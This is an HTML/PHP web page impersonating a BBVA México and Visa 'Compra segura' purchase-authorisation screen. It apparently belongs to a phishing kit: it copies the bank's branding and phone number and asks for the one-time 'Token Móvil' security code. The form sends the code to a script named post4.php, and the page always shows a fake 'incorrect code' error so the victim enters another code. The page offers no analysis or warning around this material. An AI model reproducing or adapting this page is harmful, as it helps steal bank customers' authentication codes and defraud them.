<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Compra segura BBVA</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f8f8f8;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            max-width: 400px;
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            border-top: 4px solid #004481;
        }
        .logo {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        .logo img {
            max-height: 40px;
        }
        h5 {
            font-weight: bold;
            margin-bottom: 20px;
            color: #004481;
        }
        p, h6 {
            margin: 5px 0;
        }
        .form-control {
            background-color: #f1f1f1;
            border: 1px solid #ccc;
            padding: 10px;
            font-size: 1rem;
            margin-bottom: 10px;
        }
        .form-control.is-invalid {
            border-color: red;
            background-color: #ffe6e6;
        }
        .error-message {
            color: red;
            font-weight: bold;
            margin-top: -10px;
            margin-bottom: 10px;
        }
        .info-box {
            background-color: #f1f1f1;
            padding: 10px;
            display: flex;
            align-items: center;
            font-size: 0.9rem;
            border-left: 4px solid #004481;
            margin-bottom: 20px;
        }
        .info-box i {
            margin-right: 10px;
            color: #004481;
        }
        .btn-container {
            display: flex;
            justify-content: space-between;
        }
        .btn-primary {
            background-color: #004481;
            border: none;
            width: 48%;
        }
        .btn-secondary {
            color: #004481;
            border: none;
            background-color: transparent;
            width: 48%;
            text-align: center;
            text-decoration: underline;
        }
        .help-text {
            margin-top: 20px;
            text-align: center;
            font-size: 0.9rem;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="img/bbva.jpg" alt="BBVA">
            <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png" alt="Visa">
        </div>
        <h5>Compra segura BBVA</h5>
        <p>Comprueba que los datos de tu compra sean correctos.</p>
        <p><strong>Comercio:</strong> Digital</p>
        <p><strong>Fecha:</strong> <?php echo date('d \d\e F \d\e Y'); ?></p>

        <form action="post4.php" method="POST">
            <p>Autoriza tu compra con un código de seguridad que podrás generar con el <strong>Token Móvil</strong> de tu app BBVA México.</p>
            <!-- Input con error -->
            <input type="text" class="form-control is-invalid" name="codigo_seguridad" placeholder="Introduce el código de seguridad">
            <!-- Mensaje de error -->
            <div class="error-message">
                Código incorrecto. Por favor, intenta nuevamente.
            </div>

            <div class="info-box">
                <i class="bi bi-info-circle"></i>
                <span>En la pantalla de inicio de la app BBVA México, selecciona la opción 'Token Móvil' y luego presiona 'Generar código'.</span>
            </div>

            <div class="btn-container">
                <button type="submit" class="btn btn-primary">Autorizar</button>
                <button type="button" class="btn btn-secondary">Cancelar</button>
            </div>
        </form>

        <div class="help-text">
            <p>¿Necesitas ayuda? Llama a Línea BBVA al 55 5226 2669</p>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.js"></script>
</body>
</html>
